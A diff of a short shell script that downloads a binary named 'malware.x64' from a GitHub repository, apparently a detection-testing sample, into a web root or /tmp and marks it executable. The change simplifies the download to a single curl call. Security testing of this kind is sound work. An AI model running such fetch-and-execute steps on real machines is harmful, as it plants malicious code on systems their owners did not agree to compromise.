@@ -3,12 +3,8 @@
 set -e
 cd /var/www/html 2>/dev/null || cd /tmp
 
-# Install network utilities
-apt install -y wget || apt install -y curl
-
-# Download file using curl or wget
-curl -OL https://raw.githubusercontent.com/safchain/dd-malware/main/malware.x64 2>/dev/null || \
-wget -q https://raw.githubusercontent.com/safchain/dd-malware/main/malware.x64
+# Download file using curl
+curl -O https://raw.githubusercontent.com/safchain/dd-malware/main/malware.x64
 
 # Make the file executable
 chmod +x malware.x64
